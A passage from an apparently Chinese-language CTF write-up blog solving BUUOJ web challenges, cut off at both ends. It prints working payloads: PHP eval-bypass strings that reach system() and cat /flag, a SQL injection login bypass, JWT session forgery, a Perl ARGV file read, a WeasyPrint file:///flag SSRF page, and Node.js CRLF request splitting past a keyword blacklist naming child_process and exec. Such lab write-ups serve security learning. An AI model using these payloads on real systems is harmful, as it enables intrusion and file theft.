class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总共三种方法，不过只有异或的方法适合这题</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">PHP函数：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 函数：返回指定目录中的文件和目录的数组。</span><br><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">()</span></span> 函数：在任意进制之间转换数字。</span><br><span class="line"><span class="function"><span class="title">dechex</span><span class="params">()</span></span> 函数：把十进制转换为十六进制。</span><br><span class="line"><span class="function"><span class="title">hex2bin</span><span class="params">()</span></span> 函数：把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line"><span class="function"><span class="title">var_dump</span><span class="params">()</span></span> ：函数用于输出变量的相关信息。</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</span><br><span class="line">语法：readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>


<p><strong>方法一：利用数学函数运算得到函数和命令</strong></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="built_in">pi</span>=<span class="keyword">system</span>&amp;<span class="built_in">abs</span>=&lt;command&gt;</span><br></pre></td></tr></table></figure>
<p><em>分析：</em></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">&quot;hex2bin&quot;</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">&quot;5f474554&quot;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span>_GET)&#123;<span class="built_in">abs</span>&#125;) <span class="comment">//&#123;&#125;可以代替[]</span></span><br></pre></td></tr></table></figure>
<p><strong>方法二：拼凑出getallheaders利用HeaderRCE</strong></p>
<blockquote>
<p>getallheaders — 获取全部 HTTP 请求头信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu56-2.jpg"></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert,<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">然后抓包在请求头中添加 <span class="number">1</span>：cat /flag</span><br></pre></td></tr></table></figure>
<p>分析</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)</span></span> =&gt; <span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">&quot;getallheaders&quot;</span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(getallheaders()</span></span>&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//操作xx和yy，中间用逗号隔开，echo都能输出</span></span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>
<p><strong>方法三：异或</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;       &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在运行结果中找到_GET即可，构造payload</p>
<blockquote>
<p>is_nan^64==&gt;_G</p>
<p>tan^15==&gt;ET</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?c=<span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>


<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>知识点：万能密码</p>
<p>SQL查询，过滤了：<code>union</code>、<code>sleep</code>、<code>&#39;</code>、<code>&quot;</code>、<code>or</code>、<code>-</code>、<code>benchmark</code></p>
<p><code>order by</code>测试字段数，发现当<code>order by 2</code>时返回正常<code>order by 3</code>返回没有这个字段，确定为两个字段，一个为<code>uniqueid</code>另一个应该就是flag</p>
<p>那么应该就是输入id判断登录，即可，尝试万能密码登录：<code>1 || 1=1 limit 0,1;</code>即可得到flag</p>
<h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>知识点：</p>
<ol>
<li>jwt</li>
<li>session伪造</li>
<li>curl</li>
</ol>
<p>随便注册个用户（admin无法注册），登入，来到文件上传页面，上传文件抓包，发现session-id ,尝试jwt解密，参数有我们注册的账号，猜测为session伪造，不过我们需要知道密钥，dirsearch扫目录，得到robots.txt，一路访问，得到密钥，伪造admin，修改session刷新后，即到admin界面，发现flag.php ,访问如下，即可得到flag</p>
<blockquote>
<p>view-source:<a href="http://f856cd93-d803-43c1-86e7-32e0a2b5ee1a.node3.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png">http://f856cd93-d803-43c1-86e7-32e0a2b5ee1a.node3.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png</a></p>
</blockquote>
<p>也可以在命令行</p>
<blockquote>
<p>curl <a href="http://f856cd93-d803-43c1-86e7-32e0a2b5ee1a.node3.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png">http://f856cd93-d803-43c1-86e7-32e0a2b5ee1a.node3.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png</a></p>
</blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank">curl用法指南</a></p>
<h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><p>知识点：</p>
<ol>
<li><p>perlparam()任意文件读取</p>
</li>
<li><p>ARGV</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu56.jpg"></p>
<p><strong>perl中<code>ARGV</code>是遍历数组变量<code>@ARVG</code>中的所有文件名的特殊文件句柄，<code>@ARVG</code>传给脚本的命令行参数列表</strong></p>
<p><strong>Perl 会将 perl 命令行参数列表放入到数组<code>@ARGV</code>中，而默认情况下，这些命令行参数是Perl的数据输入源，也就是Perl会以依次将他们当作文件进行读取</strong></p>
<p>进入场景后有3个链接，点进去都是.pl文件，.pl文件都是用perl编写的网页文件</p>
<p>利用点在第三个链接，尝试后发现，Files链接可以上传文件并把文件内容打印出来。对此，大佬猜测后台代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">strict</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">warnings</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">CGI</span>;</span><br><span class="line">my <span class="variable">$cgi</span>= CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$cgi</span>-&gt;upload( ‘file‘ ) ) &#123; </span><br><span class="line">    my <span class="variable">$file</span>= <span class="variable">$cgi</span>-&gt;param( ‘file‘ );</span><br><span class="line">     <span class="keyword">while</span> ( &lt;<span class="variable">$file</span>&gt; ) &#123; <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$_</span>&quot;</span>; &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p><strong>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的。</strong></p>
<p><strong>如果在原来的数据包中新增一个文件上传项，并且删除其<code>filename</code>参数， 后端会将第一个上传项的内容作为<code>$file</code>参数的值，因此我们可以控制$file变量的值</strong></p>
<p><strong>如果<code>$file</code>变量的值是<code>ARGV</code>文件句柄,而<code>ARGV</code>文件句柄会将<code>@ARGV</code>数组的每一项作为文件名并读取它们的内容，也就是说在URL后添加的路径会被放入到<code>@ARGV</code>数组中，配合之前引入的<code>ARGV</code>文件句柄，我们就可以读取任意文件</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu57.jpg"></p>
<h2 id="BSidesCF-2020-Cards"><a href="#BSidesCF-2020-Cards" class="headerlink" title="[BSidesCF 2020]Cards"></a>[BSidesCF 2020]Cards</h2><p>知识点：脚本编写</p>
<p><del>做这题之前先去学了下21点的玩法23333</del></p>
<p>访问<code>/api</code>可以得到一个 SecretState 这个是当前余额的一个哈希码</p>
<p>访问<code>/api/deal</code>可以进行赌博，但是只要我们的 state 不会变，我们的余额就不会变，当我们的应答包含 BlackJack 的时候，我们的余额会增加，然后我们就可以获取它的 SerectState 进行下一次赌博，这样就可以一直赢了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">start = <span class="string">&quot;http://b42cb231-7e9b-45db-a960-99f5fc875ca6.node3.buuoj.cn/api&quot;</span></span><br><span class="line">deal = start + <span class="string">&quot;/deal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开局</span></span><br><span class="line">state = requests.post(start).json()[<span class="string">&quot;SecretState&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 下注</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(deal, json=&#123;<span class="string">&quot;Bet&quot;</span>: <span class="number">500</span>, <span class="string">&quot;SecretState&quot;</span>: state&#125;).json()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> resp[<span class="string">&#x27;GameState&#x27;</span>] == <span class="string">&#x27;Blackjack&#x27;</span>:</span><br><span class="line">        state = resp[<span class="string">&#x27;SecretState&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    print(resp[<span class="string">&#x27;Balance&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> resp[<span class="string">&#x27;Balance&#x27;</span>] &gt; <span class="number">100000</span>:</span><br><span class="line">        print(resp)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>flag在state最后</p>
<h2 id="FireshellCTF2020-URL-TO-PDF"><a href="#FireshellCTF2020-URL-TO-PDF" class="headerlink" title="[FireshellCTF2020]URL TO PDF"></a>[FireshellCTF2020]URL TO PDF</h2><p>知识点：</p>
<ol>
<li>ssrf</li>
<li>Burp Collaborator</li>
</ol>
<p>打开题目，是个 URL 转 PDF 的在线转换器,输入一个 URL，就会转成 PDF。但是不能直接用 <code>file://</code> 协议去读本地文件，会报错。使用bp的Burp Collaborator模块看下请求</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu58.jpg"></p>
<p>发现使用了 WeasyPrint</p>
<p><strong>在 Hacker One – Ben Sadeghipour 的这个关于 SSRF 的 DEF CON 议题上，有一部分专门介绍了 Weasy Print。</strong></p>
<blockquote>
<p><strong>Attachments are related files, embedded in the PDF itself. They can be specified through <link rel="attachment"> elements to add resources globally or through regular links with <a rel="attachment"> to attach a resource that can be saved by clicking on said link. The title attribute can be used as description of the attachment.</a></strong></p>
</blockquote>
<p><strong>意思就是说我们可以使用锚和链接标签将文件作为附件嵌入到生成的PDF中，并且可以轻松地从PDF中提取附件</strong></p>
<p>它可以解析 <code>&lt;link attachment=xxx&gt;</code>，因此我们可以在 vps 上构造 payload： <code>&lt;link rel=”attachment” href=”file:///flag”&gt;</code>，下载下来的 pdf 虽说没有显示，但是放到<code>binwalk -e 文件名</code>后打开解压的文件 中看能看到 flag，提取出即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;attachment&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>知识点：</p>
<ol>
<li>CRLF</li>
<li>SSRF</li>
</ol>
<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">&quot;index&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>( action.includes(<span class="string">&quot;/&quot;</span>) || action.includes(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">res.send(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">file = path.join(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>/<br>接受action参数。如果没有就默认为index<br>file=dirname+/template/+action+.png<br>然后用pug引擎进行渲染。可以理解为执行这个文件</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">msg: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">obj.msg=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(err)&#123;</span><br><span class="line">obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">&quot;/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line"><span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line"><span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">fs.mkdirSync(__dirname + file_path)</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">obj.msg = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">fs.writeFileSync(dir_file,data)</span><br><span class="line">obj = &#123;</span><br><span class="line">msg: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">filename: file_path + file_name</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>/file_upload<br>上传文件时先判断是否是 127.0.0.1 也就是本地请求<br>那么得找一个SSRF的点<br>然后就是获取上传的文件，根据其传过去的 MIME 类型保存到指定目录<br>filepath=/uploads/+mimetype+/<br>而mimetype可控。那么我们可以跨目录,构造任意路径文件写入</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/core&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> q = req.query.q;</span><br><span class="line"><span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (q) &#123;</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line"><span class="built_in">console</span>.log(url)</span><br><span class="line"><span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line"><span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">res.send(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">resp.setEncoding(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">resp.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (err.code === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">resp.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">resps = chunk.toString();</span><br><span class="line">res.send(resps);</span><br><span class="line">&#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">res.send(e.message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">res.send(e.message);&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.send(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line"><span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line"><span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> host = server.address().address</span><br><span class="line"><span class="keyword">var</span> port = server.address().port</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>/core<br>接受一个q参数。然后对其进行黑名单检测<br>然后对q输入的值进行请求,明显就是SSRF点了</p>
</blockquote>
<p>总的来说就是利用../template进行跨目录。经过处理后就变成了uploads/../template/flag.pug<br>然后刚好就可以通过action参数请求执行,pub文件的内容是包含多个上级目录的flag.txt</p>
<p>不过我们还需要绕过黑名单，可以通过url编码进行绕过，也可以通过nodejs8特性进行绕过</p>
<p><a href="https://xz.aliyun.com/t/2894" target="_blank">通过拆分实现SSRF攻击</a></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu59.jpg"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">原始请求数据如下：</span><br><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line">Host: xxx.xxx.xxx</span><br><span class="line"></span><br><span class="line">当我们插入数据后:</span><br><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/upload_file HTTP/</span><span class="number">1.1</span></span><br><span class="line">xxxxxx文件上传</span><br><span class="line">xxxxxx文件上传</span><br><span class="line"></span><br><span class="line">Host:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">上次请求包的Host参数就单独出来了。会报错。所以我们再构造一个请求把他闭合</span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/upload_file HTTP/</span><span class="number">1.1</span></span><br><span 